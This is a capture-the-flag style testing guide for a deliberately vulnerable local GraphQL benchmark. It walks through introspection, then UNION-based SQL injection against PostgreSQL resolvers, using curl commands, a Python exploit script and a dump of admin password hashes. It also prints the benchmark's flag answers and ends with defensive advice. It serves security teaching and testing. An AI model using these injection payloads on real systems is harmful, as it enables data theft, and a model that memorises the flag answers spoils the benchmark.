# S7BEN-VHARD-006: GraphQL Introspection to SQL Injection - Testing Guide

## Table of Contents
1. [Prerequisites](#prerequisites)
2. [Environment Setup](#environment-setup)
3. [Phase 1: GraphQL Discovery](#phase-1-graphql-discovery)
4. [Phase 2: Schema Enumeration](#phase-2-schema-enumeration)
5. [Phase 3: SQL Injection Discovery](#phase-3-sql-injection-discovery)
6. [Phase 4: Data Extraction via SQLi](#phase-4-data-extraction-via-sqli)
7. [Phase 5: Flag Retrieval](#phase-5-flag-retrieval)
8. [Alternative Exploitation Methods](#alternative-exploitation-methods)
9. [Troubleshooting](#troubleshooting)
10. [Success Criteria](#success-criteria)

---

## Prerequisites

### Required Tools
- curl command-line tool
- GraphQL client (Apollo Sandbox at http://localhost:4000/graphql, or Altair/Insomnia)
- jq for JSON parsing (optional)
- Python 3.x (optional for automation)

### Required Knowledge
- GraphQL query syntax
- GraphQL introspection mechanism
- SQL injection fundamentals
- UNION-based SQL injection
- PostgreSQL syntax

### Estimated Time
30-60 minutes

---

## Environment Setup

### Step 1: Start the Benchmark

```bash
# Navigate to benchmark directory
cd benchmarks/S7BEN-VHARD-006

# Build and start all services
docker compose up -d

# Verify services are healthy
docker compose ps
```

Expected output:
```
NAME       STATUS              PORTS
gql-api    Up (healthy)        0.0.0.0:4000->4000/tcp
gql-db     Up (healthy)        5432/tcp
```

### Step 2: Verify GraphQL API

```bash
# Test health endpoint
curl http://localhost:4000/health

# View API documentation
curl http://localhost:4000
```

Expected: JSON response `{"status":"healthy","service":"graphql-api"}`

---

## Phase 1: GraphQL Discovery

**Objective:** Identify GraphQL endpoint and verify introspection is enabled

### Step 1.1: Discover GraphQL Endpoint

```bash
# Access root endpoint
curl http://localhost:4000/

# Try common GraphQL paths
curl -X POST http://localhost:4000/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __typename }"}'
```

Expected: Response containing `{"data":{"__typename":"Query"}}`

**Key Discovery:** GraphQL endpoint is at `/graphql`

### Step 1.2: Test Introspection

Basic introspection query:

```bash
curl -X POST http://localhost:4000/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "{ __schema { queryType { name } } }"
  }'
```

Expected response:
```json
{
  "data": {
    "__schema": {
      "queryType": {
        "name": "Query"
      }
    }
  }
}
```

**Key Discovery:** Introspection is ENABLED - we can enumerate the entire schema!

### Step 1.3: List All Types

```bash
curl -X POST http://localhost:4000/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "{ __schema { types { name } } }"
  }' | jq '.data.__schema.types[].name'
```

Expected output includes:
- `User`
- `Admin`
- `Secret`
- `Query`
- `Mutation`

✅ **Phase 1 Complete** - GraphQL endpoint discovered, introspection confirmed

---

## Phase 2: Schema Enumeration

**Objective:** Extract complete GraphQL schema to identify attack surface

### Step 2.1: Enumerate Query Type

Full introspection query for Query type:

```bash
curl -X POST http://localhost:4000/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "{ __type(name: \"Query\") { name fields { name type { name kind ofType { name } } args { name type { name } } } } }"
  }' | jq
```

This reveals all available queries:
- `users` - Returns list of users
- `searchUser(username: String!)` - **Search query with argument** 🎯
- `user(id: ID!)` - Get user by ID
- `admins` - Returns admin list
- `getSecret(flagKey: String!)` - **Get secret by key** 🎯
- `allSecrets` - Returns all secrets 🎯

### Step 2.2: Enumerate User Type

```bash
curl -X POST http://localhost:4000/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "{ __type(name: \"User\") { name fields { name type { name } } } }"
  }' | jq
```

User type fields:
- `id: ID!`
- `username: String!`
- `email: String!`
- `role: String!`
- `createdAt: String!`

### Step 2.3: Enumerate Secret Type

```bash
curl -X POST http://localhost:4000/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "{ __type(name: \"Secret\") { name fields { name type { name } } } }"
  }' | jq
```

Secret type fields:
- `id: ID!`
- `flagKey: String!`
- `flagValue: String!` 🚩
- `description: String`
- `createdAt: String!`

### Step 2.4: Test Legitimate Queries

```bash
# Get all users (safe query)
curl -X POST http://localhost:4000/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "{ users { id username email role } }"
  }' | jq
```

Expected: List of users (alice, bob, charlie, david, eve)

```bash
# Search for specific user (vulnerable query)
curl -X POST http://localhost:4000/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "{ searchUser(username: \"alice\") { id username email } }"
  }' | jq
```

Expected: Returns alice's user record

✅ **Phase 2 Complete** - Full schema enumerated, identified `searchUser` and `getSecret` as potential attack vectors

---

## Phase 3: SQL Injection Discovery

**Objective:** Confirm SQL injection vulnerability in GraphQL resolvers

### Step 3.1: Test Basic SQLi with Single Quote

```bash
# Inject single quote to break SQL syntax
curl -X POST http://localhost:4000/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "{ searchUser(username: \"alice'\'''\") { id username } }"
  }'
```

**Expected:** SQL error message in response!

Example error:
```json
{
  "errors": [{
    "message": "Database error: syntax error at or near \"'\""
  }]
}
```

**Key Discovery:** SQL injection confirmed! The error leaks SQL syntax information.

### Step 3.2: Test Boolean-Based SQLi

Test with always-true condition:

```bash
# SQL: WHERE username LIKE '%alice' OR '1'='1%'
curl -X POST http://localhost:4000/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "{ searchUser(username: \"alice'\'' OR '\''1'\''='\''1\") { username email } }"
  }' | jq
```

**Expected:** Returns ALL users (not just alice) because `1=1` is always true

### Step 3.3: Analyze SQL Query Structure

Based on error messages, we can infer the SQL query structure:

```sql
SELECT * FROM users WHERE username LIKE '%<input>%'
```

This means we can:
1. Close the LIKE string with `'`
2. Add our own SQL conditions
3. Use UNION to extract data from other tables

✅ **Phase 3 Complete** - SQL injection confirmed in `searchUser` resolver

---

## Phase 4: Data Extraction via SQLi

**Objective:** Use UNION-based SQL injection to extract data from secrets table

### Step 4.1: Determine Column Count

First, we need to match the column count for UNION queries:

```bash
# Test with 5 columns (matching User type: id, username, email, role, createdAt)
curl -X POST http://localhost:4000/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "{ searchUser(username: \"'\'' UNION SELECT 1,2,3,4,5-- \") { id username email role } }"
  }' | jq
```

If successful, you'll see a result with numeric values in the fields.

### Step 4.2: Extract Table Names

Use PostgreSQL information_schema to list tables:

```bash
curl -X POST http://localhost:4000/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "{ searchUser(username: \"'\'' UNION SELECT NULL, table_name, NULL, NULL, NULL FROM information_schema.tables WHERE table_schema='\''public'\''-- \") { username } }"
  }' | jq '.data.searchUser[].username'
```

**Expected output:** `users`, `admins`, `secrets`

### Step 4.3: Extract Column Names from Secrets Table

```bash
curl -X POST http://localhost:4000/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "{ searchUser(username: \"'\'' UNION SELECT NULL, column_name, NULL, NULL, NULL FROM information_schema.columns WHERE table_name='\''secrets'\''-- \") { username } }"
  }' | jq '.data.searchUser[].username'
```

**Expected output:** `id`, `flag_key`, `flag_value`, `description`, `created_at`

### Step 4.4: Extract Flag Keys

```bash
curl -X POST http://localhost:4000/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "{ searchUser(username: \"'\'' UNION SELECT id::text, flag_key, description, NULL, NULL FROM secrets-- \") { id username email } }"
  }' | jq
```

**Expected:** List of flag_key values:
- `introspection`
- `sqli`
- `admin_secret`

✅ **Phase 4 Complete** - Successfully extracted table and column information via SQLi

---

## Phase 5: Flag Retrieval

**Objective:** Extract both flags from the secrets table

### Step 5.1: Extract Flag 1 (Introspection Flag)

Method 1 - Via SQL Injection:

```bash
curl -X POST http://localhost:4000/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "{ searchUser(username: \"'\'' UNION SELECT id::text, flag_key, flag_value, NULL, NULL FROM secrets WHERE flag_key='\''introspection'\''-- \") { id username email } }"
  }' | jq
```

**Expected Flag 1:** `S7BEN{graphql_introspection_schema_exposed_a1b2c3}`

Method 2 - Via Direct Query (if you discovered allSecrets):

```bash
curl -X POST http://localhost:4000/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "{ allSecrets { flagKey flagValue } }"
  }' | jq
```

### Step 5.2: Extract Flag 2 (SQL Injection Flag)

```bash
curl -X POST http://localhost:4000/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "{ searchUser(username: \"'\'' UNION SELECT id::text, flag_key, flag_value, NULL, NULL FROM secrets WHERE flag_key='\''sqli'\''-- \") { id username email } }"
  }' | jq
```

**Expected Flag 2:** `S7BEN{graphql_resolver_sql_injection_d4e5f6}`

### Step 5.3: Extract All Flags at Once

```bash
curl -X POST http://localhost:4000/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "{ searchUser(username: \"'\'' UNION SELECT id::text, flag_key, flag_value, description, created_at::text FROM secrets-- \") { id username email role createdAt } }"
  }' | jq
```

**Expected:** All three flags in response:
1. `S7BEN{graphql_introspection_schema_exposed_a1b2c3}`
2. `S7BEN{graphql_resolver_sql_injection_d4e5f6}`
3. `S7BEN{admin_panel_access_via_graphql_g7h8i9}` (bonus flag)

### Step 5.4: Alternative - Use getSecret Query

The `getSecret` query is also vulnerable:

```bash
# SQL injection in flagKey parameter
curl -X POST http://localhost:4000/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "{ getSecret(flagKey: \"introspection'\'' OR '\''1'\''='\''1\") { flagKey flagValue description } }"
  }' | jq
```

✅ **Phase 5 Complete** - Both flags successfully extracted!

---

## Alternative Exploitation Methods

### Method 1: Using Apollo Sandbox (Browser-Based)

1. Open http://localhost:4000/graphql in browser
2. Apollo Sandbox loads automatically
3. Click "Schema" tab to view full schema (introspection)
4. Use the Query panel to run introspection queries
5. Execute SQL injection payloads:

```graphql
query ExploitSQLi {
  searchUser(username: "' UNION SELECT id::text, flag_key, flag_value, NULL, NULL FROM secrets-- ") {
    id
    username
    email
  }
}
```

### Method 2: Using GraphQL Introspection Tools

Install and use graphql-cli:

```bash
# Install graphql-cli
npm install -g graphql-cli

# Download schema
graphql get-schema --endpoint http://localhost:4000/graphql --output schema.graphql

# View schema
cat schema.graphql
```

### Method 3: Python Automation Script

Create `exploit.py`:

```python
#!/usr/bin/env python3
import requests
import json

GRAPHQL_URL = "http://localhost:4000/graphql"

def graphql_query(query):
    """Execute GraphQL query"""
    response = requests.post(
        GRAPHQL_URL,
        json={"query": query},
        headers={"Content-Type": "application/json"}
    )
    return response.json()

def extract_flags():
    """Extract all flags via SQL injection"""
    # SQL injection payload
    payload = "' UNION SELECT id::text, flag_key, flag_value, description, created_at::text FROM secrets-- "

    query = f'''
    {{
      searchUser(username: "{payload}") {{
        id
        username
        email
        role
        createdAt
      }}
    }}
    '''

    result = graphql_query(query)

    if 'data' in result:
        for user in result['data']['searchUser']:
            if 'S7BEN{' in user.get('email', ''):
                print(f"Flag Key: {user['username']}")
                print(f"Flag Value: {user['email']}")
                print()

if __name__ == "__main__":
    print("[*] Extracting flags via GraphQL SQL injection...")
    extract_flags()
```

Run:
```bash
python3 exploit.py
```

### Method 4: Direct Database Query (Via SQLi)

Extract admin password hashes:

```bash
curl -X POST http://localhost:4000/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "{ searchUser(username: \"'\'' UNION SELECT id::text, username, password_hash, NULL, NULL FROM admins-- \") { id username email } }"
  }' | jq
```

---

## Troubleshooting

### Issue: Introspection Query Fails

**Solution:**
```bash
# Verify API is running
curl http://localhost:4000/health

# Check container logs
docker compose logs graphql-api

# Restart services
docker compose restart
```

### Issue: SQL Injection Not Working

**Solution:**
```bash
# Test basic query first
curl -X POST http://localhost:4000/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ users { username } }"}'

# Check SQL logs in database
docker compose logs postgres-db | grep ERROR

# Verify column count matches
# User table has 5 columns: id, username, email, role, created_at
```

### Issue: Special Characters in Payload

**Solution:**
When using curl with nested quotes, escape properly:

```bash
# Use single quotes for outer shell, escape internal quotes
curl -d '{"query":"{ searchUser(username: \"'\''\") { username } }"}'

# Or use JSON file
echo '{"query":"..."}' > query.json
curl -d @query.json http://localhost:4000/graphql
```

### Issue: UNION Column Mismatch

**Solution:**
```bash
# The users table has these columns (in order):
# 1. id (integer/text)
# 2. username (text)
# 3. email (text)
# 4. role (text)
# 5. created_at (timestamp/text)

# Match types when using UNION:
# UNION SELECT id::text, flag_key, flag_value, description, created_at::text FROM secrets
```

---

## Success Criteria

### ✅ Phase 1: GraphQL Discovery Complete
- [ ] Identified GraphQL endpoint at `/graphql`
- [ ] Confirmed introspection is enabled
- [ ] Successfully queried `__schema`
- [ ] Listed all available types

### ✅ Phase 2: Schema Enumeration Complete
- [ ] Enumerated Query type and all queries
- [ ] Identified `searchUser` and `getSecret` queries
- [ ] Discovered User, Admin, and Secret types
- [ ] Mapped all fields for each type

### ✅ Phase 3: SQL Injection Discovery Complete
- [ ] Tested single quote injection
- [ ] Observed SQL error messages
- [ ] Confirmed Boolean-based SQLi
- [ ] Identified vulnerable query structure

### ✅ Phase 4: Data Extraction Complete
- [ ] Determined column count for UNION
- [ ] Extracted table names from information_schema
- [ ] Extracted column names from secrets table
- [ ] Verified UNION-based extraction works

### ✅ Phase 5: Flag Retrieval Complete
- [ ] **Retrieved Flag 1:** `S7BEN{graphql_introspection_schema_exposed_a1b2c3}`
- [ ] **Retrieved Flag 2:** `S7BEN{graphql_resolver_sql_injection_d4e5f6}`
- [ ] Extracted bonus flag (optional)
- [ ] Verified all flags are correct

---

## Learning Outcomes

After completing this benchmark, you should understand:

1. **GraphQL Security:**
   - How introspection works and why it's dangerous in production
   - GraphQL schema structure (types, queries, mutations)
   - Difference between introspection and schema hiding

2. **GraphQL Exploitation:**
   - Enumerating GraphQL schemas via `__schema` and `__type`
   - Identifying vulnerable resolvers through schema analysis
   - Testing query parameters for injection vulnerabilities

3. **SQL Injection in GraphQL:**
   - How resolvers can introduce SQL injection
   - UNION-based data extraction techniques
   - Extracting data from different tables via SQLi
   - PostgreSQL-specific injection syntax

4. **Defensive Measures:**
   - Disable introspection in production (`introspection: false`)
   - Use parameterized queries in all resolvers
   - Implement proper input validation
   - Add query complexity/depth limiting
   - Implement authentication and authorization
   - Use GraphQL security tools (persistent queries, schema validation)

---

## Time Estimates by Phase

| Phase | Estimated Time | Difficulty |
|-------|---------------|------------|
| Phase 1: GraphQL Discovery | 5-10 min | Easy |
| Phase 2: Schema Enumeration | 10-15 min | Easy |
| Phase 3: SQLi Discovery | 5-10 min | Medium |
| Phase 4: Data Extraction | 10-15 min | Medium |
| Phase 5: Flag Retrieval | 5-10 min | Easy |
| **Total** | **30-60 min** | **Intermediate** |

---

## References

- [GraphQL Introspection Specification](https://spec.graphql.org/October2021/#sec-Introspection)
- [Apollo Server Security Best Practices](https://www.apollographql.com/docs/apollo-server/security/security)
- [OWASP GraphQL Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html)
- [GraphQL Injection](https://cwe.mitre.org/data/definitions/89.html)

---

**End of Testing Guide**
